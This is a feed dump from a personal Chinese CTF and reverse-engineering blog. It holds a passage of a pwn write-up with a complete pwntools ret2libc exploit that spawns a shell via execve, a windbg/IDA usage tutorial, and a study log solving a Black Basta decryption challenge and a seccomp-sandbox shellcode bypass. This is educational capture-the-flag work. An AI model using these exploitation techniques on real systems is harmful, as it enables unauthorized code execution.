punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just to increase the number of got tables"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token char">'!olleh'</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"hello!"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本题的思路就是先利用<code>extend</code>填满输出缓冲区，再<code>ret2libc</code>，<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">31448</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x40125D</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>pop_rsi_r12_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>extend <span class="token operator">=</span> <span class="token number">0x401287</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>extend<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">54</span> <span class="token operator">+</span> p1 <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x84420</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_baseexecve <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;比赛打一半去学逆向啦， &lt;code&gt;awdp&lt;/code&gt;的&lt;code&gt;pwn&lt;/code&gt;没打&lt;/p&gt;
&lt;h3 id=&quot;初探勒索病毒&quot;&gt;&lt;a href=&quot;#初探勒索病毒&quot; class=&quot;headerlink&quot; title=&quot;初探勒索病毒&quot;&gt;&lt;/a&gt;初探勒索病毒&lt;/h3&gt;&lt;</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>windbg+IDA逆向分析基础用法</title>
    <link href="https://starrysky1004.github.io/2024/07/11/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/"/>
    <id>https://starrysky1004.github.io/2024/07/11/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/</id>
    <published>2024-07-11T15:50:14.000Z</published>
    <updated>2024-07-11T16:48:21.262Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windbg基础用法"><a href="#windbg基础用法" class="headerlink" title="windbg基础用法"></a>windbg基础用法</h2><h3 id="运行前"><a href="#运行前" class="headerlink" title="运行前"></a>运行前</h3><p>打开文件：<code>文件 -&gt; Launch executable</code></p><p>查看反编译汇编：<code>View -&gt; Layouts -&gt; Disassembly</code></p><p>设置符号路径：<code>.sympath srv*</code></p><p>加载符号：<code>.reload</code></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>运行：<code>g</code></p><p>单步执行不进入函数：<code>p</code></p><p>单步执行进入函数：<code>t</code></p><h3 id="查看-x2F-修改状态"><a href="#查看-x2F-修改状态" class="headerlink" title="查看&#x2F;修改状态"></a>查看&#x2F;修改状态</h3><p>查看堆栈状态：<code>kb</code></p><p>查看寄存器：<code>r</code> &#x2F; <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p>查看指定地址反编译代码：<code>u addr</code></p><p>以双字的形式查看内存：</p><p><code>dd addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>dc addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; dc 0040000000400000  00405000 00406000 00407000 00408000  .P...&#96;...p...&#96;...00400010  00409000 0040A000 0040B000 0040C000  ..&#96;...&#96;...&#96;...&#96;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以<code>Unicode</code>字符串的形式查看内存：<code>du addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; du 0040000000400000  &quot;Hello, world!&quot;00400010  &quot;This is a test string.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以字节的形式查看内存：<code>db addr / register</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello, world!...00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以ASCII字符的形式查看内存：<code>da addr / register</code></p><p>以字的形式查看内存：<code>dw addr / register</code></p><p>以十六进制双字的形式查看内存：<code>dD addr / register</code></p><p>以内存内容的指针的形式查看内存：<code>dp addr / register</code></p><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><p>查看断点详细情况：<code>bl</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bl     0 e Disable Clear  00000000 e 1 0001 (0001)  0:****      1 e Disable Clear  00300003     0001 (0001)  0:**** GOM32Q_vc120_ReleaseQC+0x3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看断点：<code>.bpcmds</code></p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; .bpcmdsba0 e1 0x00000000 ;bp1 0x00300003 ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下断点：</p><p><code>bp</code> ：设置断点，在指定断点位置设置新的断点，如果调试器无法解析断点位置的地址表达式，则自动转换为bu断点，使用bp命令创建在卸载模块时不再处于活动状态的断点</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bp MyTest+0xb <span class="token number">7</span> <span class="token comment">#前六次忽略此断点，第七次传递时，执行会停止</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>bm</code>：设置符号断点，命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后，bm断点与bu断点相同。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> bm myprogram<span class="token operator">!</span>mem*   <span class="token number">4</span>: 0040d070 MyProgram<span class="token operator">!</span>memcpy  <span class="token number">5</span>: 0040c560 MyProgram<span class="token operator">!</span>memmove  <span class="token number">6</span>: 00408960 MyProgram<span class="token operator">!</span>memset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>bu</code>：设置未解析断点，命令设置延迟或未解析的断点。bu断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 </p><h2 id="windbg结合IDA逆向分析"><a href="#windbg结合IDA逆向分析" class="headerlink" title="windbg结合IDA逆向分析"></a>windbg结合IDA逆向分析</h2><h3 id="通过IDA中的地址下断点"><a href="#通过IDA中的地址下断点" class="headerlink" title="通过IDA中的地址下断点"></a>通过IDA中的地址下断点</h3><p>地址偏移 &#x3D; <code>IDA中的地址 - IDA中的基址</code></p><p>查看模块名称&#x2F;地址：<code>lm</code> （基址为<code>start</code>一列</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> lmstart    end        module name00300000 010f9000   GOM32Q_vc120_ReleaseQC   <span class="token punctuation">(</span>no symbols<span class="token punctuation">)</span>           05990000 05a4c000   swscale_gp_5   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05a50000 05d69000   avutil_gp_56   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>             05d70000 07366000   avcodec_gp_58   <span class="token punctuation">(</span>deferred<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取<code>windbg</code>中的地址：<code>模块基址 + 地址偏移</code></p><p>下断点：<code>bu 模块名称 + 地址偏移</code> &#x2F; <code>bu windbg中的地址</code></p><p>例如：<code>IDA</code>中的基址为<code>0x400000</code>，要在<code>IDA</code>中地址为<code>0x500000</code>的位置下断点，则地址偏移为<code>0x500000 - 0x400000 = 0x100000</code>，假设<code>lm</code>查看模块名为<code>test</code>，该模块基址为<code>0x200000</code>，则在<code>windbg</code>中的地址就是<code>0x300000</code>，那么下断点就是<code>du test + 0x100000</code> &#x2F; <code>du 0x300000</code></p><h3 id="通过栈回溯找到IDA中对应函数"><a href="#通过栈回溯找到IDA中对应函数" class="headerlink" title="通过栈回溯找到IDA中对应函数"></a>通过栈回溯找到IDA中对应函数</h3><p>栈回溯查看堆栈情况：<code>kb</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token comment"># ChildEBP RetAddr      Args to Child              </span>WARNING: Stack unwind information not available. Following frames may be wrong.00 014fedc0 009371cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 014fede4 00506a63     014feeec 00000104 0f4aeea8 GOM32Q_vc120_ReleaseQC+0x6371cc02 014ff138 004ed040     0f4cf948 00000001 0080723a GOM32Q_vc120_ReleaseQC+0x206a6303 014ff1fc 008082e2     00a9b640 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 014ff21c 0080392f     0000c391 0f4cf948 00010004 GOM32Q_vc120_ReleaseQC+0x5082e205 014ff28c 008040ea     0f4cd4c0 00010a66 0000c391 GOM32Q_vc120_ReleaseQC+0x50392f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到形如<code>模块名+地址偏移</code>的栈回溯，要找到在<code>IDA</code>中的对应基址只需要用模块名加上的这个地址偏移（即加号后面部分）再加上<code>IDA</code>基址即可</p><p>例如：<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>，则地址偏移为<code>0x6371de</code>，IDA基址为<code>0x400000</code>，那么在<code>IDA</code>中的地址就是<code>0x6371de + 0x400000 = 0xA371DE</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;windbg基础用法&quot;&gt;&lt;a href=&quot;#windbg基础用法&quot; class=&quot;headerlink&quot; title=&quot;windbg基础用法&quot;&gt;&lt;/a&gt;windbg基础用法&lt;/h2&gt;&lt;h3 id=&quot;运行前&quot;&gt;&lt;a href=&quot;#运行前&quot; class=&quot;header</summary>
      
    
    
    
    <category term="逆向" scheme="https://starrysky1004.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="reverse" scheme="https://starrysky1004.github.io/tags/reverse/"/>
    
    <category term="windbg" scheme="https://starrysky1004.github.io/tags/windbg/"/>
    
  </entry>
  
  <entry>
    <title>2024暑期学习记录</title>
    <link href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/"/>
    <id>https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</id>
    <published>2024-07-05T14:27:58.000Z</published>
    <updated>2024-07-17T07:31:06.045Z</updated>
    
    <content type="html"><![CDATA[<p>复盘了一下这学期欠缺的待学习内容，简单列了个学习计划，写了这篇博客记录一下暑假学习历程，也是激励自己每天多学一点</p><img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92.png" class><h2 id="7-5"><a href="#7-5" class="headerlink" title="#7.5"></a>#7.5</h2><p>早上和晚上在打春秋杯夏季赛，下午被摇过去改论文，春秋杯打完就不打算打比赛啦，留时间把没完成的事完成一下，然后跟着学长一起复现</p><h3 id="初探勒索病毒"><a href="#初探勒索病毒" class="headerlink" title="初探勒索病毒"></a>初探勒索病毒</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：你服务器上的一张图片被Black Basta勒索病毒给加密了。当你在服务器上还原出该图片后，等待一分钟左右，&#x2F;flag就会变为可读权限。（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）（关注微信公众号“勒索病毒头条”，发送关键词“BASTA”可获取该题提示。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我选择直接获取提示</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">【2024春秋杯夏季赛】https://www.nomoreransom.org/zh/decryption-tools.html搜索BlackBasta，并点击下载。（如果您还需要进一步的提示，可在本公众号输入“BASTA2”获取。）【2024春秋杯夏季赛】<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg.sah28vut5 ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题的判断依据是能不能正常访问<code>banana.jpg</code>这个图片，所以把<code>banana.jpg.sah28vut5</code>改成<code>banana.jpg</code>再用上面给的指令解密，图片在<code>/var/www/html</code>目录下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> ./banana.jpg.sah28vut5 ./banana.jpg<span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/flags/"flags"/'</span> ./decryptblocks.py<span class="token builtin class-name">export</span> <span class="token assign-left variable">SRL_IGNORE_MAGIC</span><span class="token operator">=</span><span class="token number">1</span>./decryptblocks.py ./banana.jpg ./key.block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h3><pre class="line-numbers language-none"><code class="language-none">题目内容：The Fishmonger found a secured entrance to somewhere...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>一道写<code>shellcode</code>的题，创建了一段可读可写可执行区域，写入<code>0x250</code>的数据后开了沙箱并对输入内容进行随机化操作，但是操作长度的判断是通过<code>strlen</code>获取的，所以直接输入<code>\x00</code>即可绕过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-18h]</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x1337000</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0x1337000LL</span><span class="token punctuation">,</span> <span class="token number">0x250LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> len <span class="token operator">&lt;=</span> <span class="token number">0xAF</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">entrance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"Error triggered..."</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看沙箱内容，发现禁用了<code>execve execveat open read readv pread preadv write sendmsg</code>，最后选择用<code>openat preadv2 writev</code>，需要注意的是<code>preadv2 writev</code>的用法</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">2147418112LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">59LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">322LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">19LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token 